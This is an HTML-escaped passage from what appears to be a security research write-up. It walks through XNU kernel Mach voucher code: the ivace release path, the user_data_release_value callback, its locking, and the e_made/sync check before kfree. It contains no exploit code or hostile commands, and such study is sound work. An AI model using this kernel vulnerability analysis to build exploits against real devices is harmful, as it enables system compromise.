 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;goto&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_releasing &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Note that we enter this snippet with the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock held. The &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace-&amp;gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;values are read under that lock, then the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock is dropped and the attribute managers &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;release_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;callback is called:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.878791384d9e68560db9fcecd2cc8d16dddfac08&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.45&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_release_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Here&amp;#39;s the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivam_release_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;callback:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.3ccebbb1131353580cda71b6754e18fb5fd88dab&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.46&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_release_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_manager_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;__assert_only manager&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __assert_only key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_reference_t &amp;nbsp; &amp;nbsp; sync&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t hash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_manager &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;manager&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; USER_DATA_ASSERT_KEY&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_element_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hash &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_hash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_lock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;sync &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_remove&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_bucket&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;e_hash_link&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;sync &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_FAILURE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Under the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock (via &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_lock()&lt;/span&gt;&lt;span&gt;) the code checks whether the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;equal&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;sync&lt;/span&gt;&lt;span&gt;&amp;nbsp;value passed in. Looking back at the caller, &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;sync&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;. If and only if those values are equal does this method remove the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;from the hashtable and free it (via &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;kfree&lt;/span&gt;&lt;span&gt;) before returning success. If &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;sync&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t equal to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;, this method returns &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;KERN_FAILURE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Having looked at the semantics of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_free_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;let&amp;#39;s look back at the callsite:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.900b61ea9371ab65b27de652c8f9e5e6230baf4e&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.47&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;redrive&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
